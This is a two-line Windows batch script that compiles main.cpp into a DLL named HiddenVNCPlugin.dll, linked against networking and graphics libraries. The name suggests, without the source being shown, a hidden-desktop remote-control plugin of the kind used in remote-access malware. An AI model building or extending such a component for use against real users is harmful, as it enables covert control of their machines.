@echo off
g++ -shared -o ../../HiddenVNCPlugin.dll main.cpp -lws2_32 -lgdiplus -lgdi32 -luser32 -lole32 -static-libgcc -static-libstdc++ -I../../include
